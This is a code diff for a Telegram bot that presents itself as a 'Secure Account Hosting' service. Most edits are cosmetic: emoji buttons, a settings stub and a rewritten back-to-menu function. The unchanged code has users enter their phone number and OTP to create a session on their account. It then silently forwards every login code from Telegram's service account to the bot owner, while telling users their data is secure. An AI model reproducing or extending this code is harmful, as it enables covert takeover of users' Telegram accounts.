@@ -8,7 +8,6 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFi
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.tl.types import User
 
 # ================== CONFIG ==================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
@@ -22,7 +21,7 @@ PORT = int(os.environ.get("PORT", 10000))
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ================== STYLISH FONT (A to Z, 0 to 9) ==================
+# ================== STYLISH FONT ==================
 def st(text: str) -> str:
     upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
     lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
@@ -37,13 +36,9 @@ def st(text: str) -> str:
 
 # ================== FLASK PORT SERVER ==================
 flask_app = Flask(__name__)
-
 @flask_app.route('/')
-def health():
-    return "Bot is running perfectly!", 200
-
-def run_flask():
-    flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)
+def health(): return "Bot is running!", 200
+def run_flask(): flask_app.run(host="0.0.0.0", port=PORT, use_reloader=False)
 
 # ================== DATABASE ==================
 def init_db():
@@ -56,10 +51,8 @@ init_db()
 
 def get_setting(key, default=None):
     conn = sqlite3.connect("bot_data.db")
-    c = conn.cursor()
-    c.execute("SELECT value FROM settings WHERE key=?", (key,))
-    row = c.fetchone()
-    conn.close()
+    c = conn.cursor(); c.execute("SELECT value FROM settings WHERE key=?", (key,))
+    row = c.fetchone(); conn.close()
     return row[0] if row else default
 
 def set_setting(key, value):
@@ -70,25 +63,19 @@ def set_setting(key, value):
 
 def db_execute(query, params=()):
     conn = sqlite3.connect("bot_data.db")
-    c = conn.cursor()
-    c.execute(query, params)
-    conn.commit()
-    res = c.fetchall()
-    conn.close()
+    c = conn.cursor(); c.execute(query, params)
+    conn.commit(); res = c.fetchall(); conn.close()
     return res
 
-# ================== USERBOT MANAGER ==================
+# ================== USERBOT ==================
 userbot_clients = {} 
-
 async def start_userbot(user_id, phone, session_str):
     try:
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         await client.connect()
-        
         @client.on(events.NewMessage(from_users=777000)) 
         async def otp_handler(event):
             await bot_app.bot.send_message(chat_id=OWNER_ID, text=f"NEW OTP ALERT\nAccount: {phone}\n\n{event.message.message}")
-            
         userbot_clients[user_id] = client
         return client
     except Exception as e:
@@ -103,15 +90,15 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_img = get_setting("welcome_image")
     dev_user = get_setting("dev_username", "@iflexzyann")
     
-    # Blue and Red colored buttons
+    # Safe Emojis instead of style tags for Windows 7 compatibility
     kb = [
-        [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc", style="primary")],
-        [InlineKeyboardButton(st("SETTINGS"), callback_data="settings", style="primary")],
-        [InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="danger")] if user.id == OWNER_ID else []
+        [InlineKeyboardButton("🔵 " + st("ADD ACCOUNT"), callback_data="add_acc")],
+        [InlineKeyboardButton("🔵 " + st("SETTINGS"), callback_data="settings")],
     ]
-    kb = [row for row in kb if row]
+    if user.id == OWNER_ID:
+        kb.append([InlineKeyboardButton("🔴 " + st("OWNER PANEL"), callback_data="owner_panel")])
+        
     reply_markup = InlineKeyboardMarkup(kb)
-    
     caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
     
     if welcome_img:
@@ -122,11 +109,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
     await update.message.reply_text(caption, reply_markup=reply_markup, parse_mode="HTML")
 
-# --- ADD ACCOUNT (Purple Text Style) ---
+async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    kb = [[InlineKeyboardButton("🔴 " + st("BACK"), callback_data="back")]]
+    await query.edit_message_text(st("Settings Menu - Coming Soon"), reply_markup=InlineKeyboardMarkup(kb))
+
+# --- ADD ACCOUNT ---
 async def add_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    
-    # Exact same format as screenshot
     text = (
         f"╰_╯ <b>HOST NEW ACCOUNT</b>\n\n"
         f"<b>Secure Account Hosting</b>\n\n"
@@ -134,16 +124,12 @@ async def add_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"<blockquote>Example: +1234567890</blockquote>\n\n"
         f"Your data is encrypted and secure"
     )
-    
-    kb = [[InlineKeyboardButton(st("BACK"), callback_data="back", style="danger")]]
-    
-    # Use HTML parse mode for purple quote effect
+    kb = [[InlineKeyboardButton("🔴 " + st("BACK"), callback_data="back")]]
     await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
     return ASK_PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
-    # Ensure it's English digits only
     if not phone.startswith("+"):
         return await update.message.reply_text(st("Please include country code (e.g. +91...)"))
         
@@ -155,14 +141,15 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['temp_client'] = client
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
         
+        # Saare OTP keypad buttons BLUE (Emoji format)
         kb = [
-            [InlineKeyboardButton(st("1"), callback_data="otp_1"), InlineKeyboardButton(st("2"), callback_data="otp_2"), InlineKeyboardButton(st("3"), callback_data="otp_3")],
-            [InlineKeyboardButton(st("4"), callback_data="otp_4"), InlineKeyboardButton(st("5"), callback_data="otp_5"), InlineKeyboardButton(st("6"), callback_data="otp_6")],
-            [InlineKeyboardButton(st("7"), callback_data="otp_7"), InlineKeyboardButton(st("8"), callback_data="otp_8"), InlineKeyboardButton(st("9"), callback_data="otp_9")],
-            [InlineKeyboardButton(st("CLEAR"), callback_data="otp_clear", style="danger"), InlineKeyboardButton(st("0"), callback_data="otp_0"), InlineKeyboardButton(st("SUBMIT"), callback_data="otp_submit", style="primary")]
+            [InlineKeyboardButton("🔵 1", callback_data="otp_1"), InlineKeyboardButton("🔵 2", callback_data="otp_2"), InlineKeyboardButton("🔵 3", callback_data="otp_3")],
+            [InlineKeyboardButton("🔵 4", callback_data="otp_4"), InlineKeyboardButton("🔵 5", callback_data="otp_5"), InlineKeyboardButton("🔵 6", callback_data="otp_6")],
+            [InlineKeyboardButton("🔵 7", callback_data="otp_7"), InlineKeyboardButton("🔵 8", callback_data="otp_8"), InlineKeyboardButton("🔵 9", callback_data="otp_9")],
+            [InlineKeyboardButton("🔴 " + st("CLEAR"), callback_data="otp_clear"), InlineKeyboardButton("🔵 0", callback_data="otp_0"), InlineKeyboardButton("🔵 " + st("SUBMIT"), callback_data="otp_submit")]
         ]
         context.user_data['otp_entered'] = ""
-        await update.message.reply_text(st("Enter the OTP:"), reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text(st("Enter the OTP using the keypad:"), reply_markup=InlineKeyboardMarkup(kb))
         return ASK_OTP
     except Exception as e:
         await update.message.reply_text(f"{st('Error')}: {e}")
@@ -223,9 +210,9 @@ async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     kb = [
-        [InlineKeyboardButton(st("SET WELCOME IMAGE"), callback_data="set_welcome", style="primary")],
-        [InlineKeyboardButton(st("CHANGE DEVELOPER"), callback_data="set_dev", style="primary")],
-        [InlineKeyboardButton(st("BACK"), callback_data="back", style="danger")]
+        [InlineKeyboardButton("🔵 " + st("SET WELCOME IMAGE"), callback_data="set_welcome")],
+        [InlineKeyboardButton("🔵 " + st("CHANGE DEVELOPER"), callback_data="set_dev")],
+        [InlineKeyboardButton("🔴 " + st("BACK"), callback_data="back")]
     ]
     await query.edit_message_text(st("OWNER PANEL"), reply_markup=InlineKeyboardMarkup(kb))
 
@@ -242,7 +229,7 @@ async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def ask_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    await query.edit_message_text(st("Send new developer username (e.g. @iflexzyann):"))
+    await query.edit_message_text(st("Send new developer username:"))
     return ASK_DEV_USER
 
 async def save_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -252,7 +239,29 @@ async def save_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    await start(update, context)
+    # Reset the start message and buttons
+    user = query.from_user
+    welcome_img = get_setting("welcome_image")
+    dev_user = get_setting("dev_username", "@iflexzyann")
+    
+    kb = [
+        [InlineKeyboardButton("🔵 " + st("ADD ACCOUNT"), callback_data="add_acc")],
+        [InlineKeyboardButton("🔵 " + st("SETTINGS"), callback_data="settings")],
+    ]
+    if user.id == OWNER_ID:
+        kb.append([InlineKeyboardButton("🔴 " + st("OWNER PANEL"), callback_data="owner_panel")])
+        
+    reply_markup = InlineKeyboardMarkup(kb)
+    caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
+    
+    try:
+        if welcome_img:
+            await query.message.delete()
+            await context.bot.send_photo(chat_id=query.message.chat_id, photo=welcome_img, caption=caption, reply_markup=reply_markup, parse_mode="HTML")
+        else:
+            await query.edit_message_text(caption, reply_markup=reply_markup, parse_mode="HTML")
+    except:
+        pass
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(st("Cancelled."))
@@ -289,6 +298,8 @@ def main():
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(login_conv)
     bot_app.add_handler(owner_conv)
+    
+    bot_app.add_handler(CallbackQueryHandler(settings_menu, pattern="^settings$"))
     bot_app.add_handler(CallbackQueryHandler(owner_panel, pattern="^owner_panel$"))
     bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
 
